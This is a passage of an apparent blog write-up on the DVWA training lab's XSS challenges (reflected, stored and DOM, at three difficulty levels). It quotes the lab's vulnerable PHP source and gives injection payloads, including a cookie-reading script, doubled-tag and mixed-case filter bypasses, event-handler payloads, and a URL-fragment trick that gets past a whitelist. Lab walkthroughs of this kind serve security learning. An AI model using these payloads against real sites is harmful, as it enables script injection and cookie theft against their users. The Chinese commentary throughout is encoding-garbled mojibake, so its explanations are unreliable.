align="left">å¿…éœ€ã€‚è§„å®šæ•°ç»„ã€‚</td></tr></tbody></table></li></ul><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯¹æˆ‘ä»¬è¾“å…¥çš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œåœ¨æ¡†å†…è¾“å…¥<code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p><p><img src="/DVWA%E2%80%94XSS/3-1615702579223.png" alt="3"></p><p>ç›´æ¥è·å–ç”¨æˆ·çš„cookieï¼š<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p><p><img src="/DVWA%E2%80%94XSS/4.png" alt="4"></p><h2 id="Mediumï¼š"><a href="#Mediumï¼š" class="headerlink" title="Mediumï¼š"></a>Mediumï¼š</h2><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°æœåŠ¡å™¨å¯¹<code>&lt;script&gt;</code>è¿›è¡Œäº†è¿‡æ»¤å¤„ç†ï¼Œä½†æ˜¯æˆ‘ä»¬åŒå†™ç»•è¿‡å°±å¥½äº†ï¼š<code>&lt;script&lt;script&gt;&gt;alert(1);&lt;/script&gt;</code></p><p>æˆ–è€…å¤§å°å†™ç»•è¿‡ï¼š<code>&lt;Script&gt;alert(1);&lt;/script&gt;</code></p><p><img src="/DVWA%E2%80%94XSS/5.png" alt="5"></p><h2 id="Highï¼š"><a href="#Highï¼š" class="headerlink" title="Highï¼š"></a>Highï¼š</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨ä½¿ç”¨äº†æ­£åˆ™è¡¨è¾¾å¼ç¦ç”¨äº†<script>æ ‡ç­¾ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡<code>img</code>ã€<code>body</code>ç­‰æ ‡ç­¾çš„äº‹ä»¶æˆ–è€…<code>iframe</code>ç­‰æ ‡ç­¾çš„<code>src</code>æ³¨å…¥æ¶æ„çš„jsä»£ç ã€‚å¸¸ç”¨çš„HTMLæ ‡ç­¾äº‹ä»¶è¿˜æœ‰onerror,oneclick,onmouseover,onloadç­‰ï¼Œ</p><p>æ ¼å¼å¦‚ä¸‹ï¼šonerror/onclick/onmouseover/onload=â€œæ‰§è¡Œå†…å®¹â€</p><p>1ï¼‰<code>&lt;img src=&quot;&quot; onerror=alert(&#39;1&#39;)&gt;</code></p><ul><li>src å±æ€§è§„å®šå¤–éƒ¨è„šæœ¬æ–‡ä»¶çš„ URLã€‚</li><li>onerror äº‹ä»¶åœ¨è§†é¢‘/éŸ³é¢‘ï¼ˆaudio/videoï¼‰æ•°æ®åŠ è½½æœŸé—´å‘ç”Ÿé”™è¯¯æ—¶è§¦å‘ã€‚</li><li>è¿™å¥è¯çš„æ„æ€æ˜¯å½“åŠ è½½imgå›¾ç‰‡å¤±è´¥æ—¶æ‰§è¡Œonerroråçš„ä»£ç ã€‚</li></ul><p>2ï¼‰<code>&lt;body onload=alert(&#39;1&#39;)&gt;</code></p><ul><li>onload äº‹ä»¶ä¼šåœ¨é¡µé¢æˆ–å›¾åƒåŠ è½½å®Œæˆåç«‹å³å‘ç”Ÿã€‚</li></ul><p>3ï¼‰<code>&lt;a href=&#39;&#39; onclick=alert(&#39;1&#39;)&gt;click me&lt;/a&gt;</code></p><ul><li>hrefæ˜¯Hypertext Referenceçš„ç¼©å†™ã€‚æ„æ€æ˜¯æŒ‡å®šè¶…é“¾æ¥ç›®æ ‡çš„URLã€‚href å±æ€§çš„å€¼å¯ä»¥æ˜¯ä»»ä½•æœ‰æ•ˆæ–‡æ¡£çš„ç›¸å¯¹æˆ–ç»å¯¹<a href="https://baike.baidu.com/item/URL">URL</a>ï¼ŒåŒ…æ‹¬ç‰‡æ®µæ ‡è¯†ç¬¦å’ŒJavaScriptä»£ç æ®µã€‚</li><li>onclick äº‹ä»¶ä¼šåœ¨å…ƒç´ è¢«ç‚¹å‡»æ—¶å‘ç”Ÿ</li><li>è¿™å¥è¯ä¸­å…ƒç´ çš„åç§°ä¸º<code>click me</code>ï¼Œå½“ç‚¹å‡»<code>click me</code>æ—¶ä¼šæ‰§è¡Œonclickåé¢çš„ä»£ç ã€‚</li></ul><p>4ï¼‰<code>Iframe:&lt;body onload=alert(1)&gt;</code></p><ul><li>iframe:ä¸€ä¸ªå†…è”æ¡†æ¶è¢«ç”¨æ¥åœ¨å½“å‰ HTML æ–‡æ¡£ä¸­åµŒå…¥å¦ä¸€ä¸ªæ–‡æ¡£ã€‚ä¸€ä¸ªå†…è”æ¡†æ¶è¢«ç”¨æ¥åœ¨å½“å‰ HTML æ–‡æ¡£ä¸­åµŒå…¥å¦ä¸€ä¸ªæ–‡æ¡£ã€‚</li></ul><p>5ï¼‰<code>&lt;body onmousemove=alert(&#39;1&#39;)&gt;</code></p><ul><li>onmousemove äº‹ä»¶ä¼šåœ¨é¼ æ ‡æŒ‡é’ˆç§»åˆ°æŒ‡å®šçš„å¯¹è±¡æ—¶å‘ç”Ÿã€‚</li><li>è¿™å¥è¯æœ‰ç‚¹æ²¡æ˜ç™½ã€‚</li></ul><h1 id="Stored"><a href="#Stored" class="headerlink" title="Stored"></a>Stored</h1><h2 id="Lowï¼š-1"><a href="#Lowï¼š-1" class="headerlink" title="Lowï¼š"></a>Lowï¼š</h2><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨å¯¹æˆ‘ä»¬ä¸Šä¼ çš„æ•°æ®åšäº†è¿‡æ»¤å¤„ç†é˜²æ­¢æˆ‘ä»¬sqlæ³¨å…¥ã€‚ä½†æ˜¯æ²¡æœ‰é¢„é˜²xssï¼Œ</p><p>åœ¨messageæ è¾“å…¥ï¼š<code>&lt;script&gt;alert(1);&lt;/script&gt;</code><img src="DVWA%E2%80%94XSS/6.png" alt="6"></p><h2 id="Mediumï¼š-1"><a href="#Mediumï¼š-1" class="headerlink" title="Mediumï¼š"></a>Mediumï¼š</h2><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ul><li>æ–°å‡½æ•°</li></ul><p><strong>htmlspecialchars()å‡½æ•°ï¼š</strong>æŠŠé¢„å®šä¹‰çš„å­—ç¬¦ â€œ&lt;â€ ï¼ˆå°äºï¼‰å’Œ â€œ&gt;â€ ï¼ˆå¤§äºï¼‰è½¬æ¢ä¸º HTML å®ä½“ã€‚</p><p><strong>strip_tags()å‡½æ•°ï¼š</strong>å‰¥å»å­—ç¬¦ä¸²ä¸­çš„ HTML æ ‡ç­¾ã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°jsä¸ä¼šå†æŠŠæˆ‘ä»¬ä»messageå¤„ä¸Šä¼ çš„å±é™©å†…å®¹å½“ä½œä»£ç è§£æäº†ï¼Œè€Œä¸”æœåŠ¡å™¨å¯¹nameä¹Ÿè¿›è¡Œäº†è¿‡æ»¤å¤„ç†ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡åŒå†™å’Œå¤§å°å†™ç»•è¿‡ã€‚ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å‘ç°nameæœ‰è¾“å…¥å­—æ•°é™åˆ¶ï¼Œé‚£æˆ‘ä»¬å°±æŠ“åŒ…ä¿®æ”¹nameçš„å€¼ï¼Œ<img src="DVWA%E2%80%94XSS/7-1615726611366.png" alt="7"></p><p>ç„¶åæäº¤å³å¯<img src="DVWA%E2%80%94XSS/6.png" alt="6"></p><h2 id="Highï¼š-1"><a href="#Highï¼š-1" class="headerlink" title="Highï¼š"></a>Highï¼š</h2><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = strip_tags( addslashes( $message ) );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $name );</span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰å’ŒFlectedç±»å‹Highçº§åˆ«çš„ç»•è¿‡æ–¹æ³•å·®ä¸å¤šï¼Œä¸å†èµ˜è¿°äº†ã€‚</p><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><h2 id="Lowï¼š-2"><a href="#Lowï¼š-2" class="headerlink" title="Lowï¼š"></a>Lowï¼š</h2><p>æŸ¥çœ‹æœåŠ¡å™¨ç«¯æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No protections, anything goes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨ç«¯æ²¡æœ‰ä»»ä½•phpæºç ï¼Œå› æ­¤ç”¨æˆ·è¾“å…¥å…¨ç”±å‰ç«¯jså¤„ç†</p><p>æŸ¥çœ‹å‰ç«¯æºç ï¼š![1](DVWAâ€”DOM Based Cross Site Scripting (XSS)/1.png)</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‰ç«¯é€šè¿‡GETçš„æ–¹å¼è·å–å‚æ•°defaultçš„å€¼ï¼Œå› æ­¤æˆ‘ä»¬åœ¨urlæ æ„é€ payload![2](DVWAâ€”DOM Based Cross Site Scripting (XSS)/2.png)</p><ul><li>æ–°å‡½æ•°ï¼š</li></ul><p><strong>alert()å‡½æ•°</strong></p><p>åŠŸèƒ½ï¼šç”¨äºæ˜¾ç¤ºå¸¦æœ‰ä¸€æ¡æŒ‡å®šæ¶ˆæ¯å’Œä¸€ä¸ªç¡®å®šæŒ‰é’®çš„è­¦å‘Šæ¡†ã€‚</p><p>è¯­æ³•ï¼šalert(message)</p><table><thead><tr><th>å‚æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>message</td><td>è¦åœ¨ window ä¸Šå¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­æ˜¾ç¤ºçš„çº¯æ–‡æœ¬ï¼ˆè€Œé HTML æ–‡æœ¬ï¼‰</td></tr></tbody></table><h2 id="Mediumï¼š-2"><a href="#Mediumï¼š-2" class="headerlink" title="Mediumï¼š"></a>Mediumï¼š</h2><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    $default = $_GET[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos ($default, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æäº†å¥½ä¹…ï¼Œä¸€æ­¥ä¸€æ­¥æ¥å§</p><p>1ï¼‰å…ˆçœ‹ç½‘é¡µæºç ï¼š<img src="DVWA%E2%80%94XSS/8.png" alt="8"></p><p>2ï¼‰å°è¯•ç”¨ä¹‹å‰å­¦è¿‡çš„æ¢æ ‡ç­¾çš„æ–¹å¼ç»•è¿‡ï¼š<code>&lt;img src=1 oneeror=alert(1)&gt;</code></p><p><img src="DVWA%E2%80%94XSS/9-1615818452797.png" alt="9"></p><p>å‘ç°ä¸ä¼šåƒä¹‹å‰ä¸€æ ·æœ‰å¼¹çª—è·³å‡ºæ¥ï¼ŒåŸå› æ˜¯æˆ‘ä»¬çš„ä»£ç è¢«<option>æ ‡ç­¾åŒ…è£¹äº†ï¼Œå› æ­¤æˆ‘ä»¬å°è¯•æå‰é—­åˆ</p><p>3ï¼‰æå‰é—­åˆoptionæ ‡ç­¾ï¼š<code>&gt;&lt;/option&gt;&lt;img src=1 oneeror=alert(1)&gt;</code></p><p><img src="DVWA%E2%80%94XSS/10.png" alt="10"></p><p>å¼¹çª—è¿˜æ˜¯æ²¡æœ‰è·³å‡ºæ¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿæå‰é—­åˆselectæ ‡ç­¾</p><p>4ï¼‰æå‰é—­åˆselectæ ‡ç­¾ï¼š<code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 oneeror=alert(1)&gt;</code></p><p><img src="DVWA%E2%80%94XSS/11.png" alt="11"></p><p>å¼¹çª—åˆæˆåŠŸå¼¹å‡º</p><h2 id="Highï¼š-2"><a href="#Highï¼š-2" class="headerlink" title="Highï¼š"></a>Highï¼š</h2><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> ($_GET[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨è®¾ç«‹äº†ç™½åå•ã€‚è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨DOMå‹xssçš„æ•°æ®ä¸ç»è¿‡æœåŠ¡å™¨çš„ç‰¹ç‚¹æ¥ç»•è¿‡äº†ã€‚</p><p>æ„é€ payloadï¼š<code>English#&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><img src="DVWA%E2%80%94XSS/12.png" alt="12"></p><p>ç”±äºæœåŠ¡å™¨ä»¥getæ–¹å¼è·å–defaultçš„å€¼ï¼Œè€Œæµè§ˆå™¨ä¸ä¼šæŠŠURLä¸­<code>#</code>åçš„å†…å®¹æäº¤åˆ°æœåŠ¡å™¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å®Œç¾ç»•è¿‡ã€‚</p></script></p>]]></content>
    
    
      
      
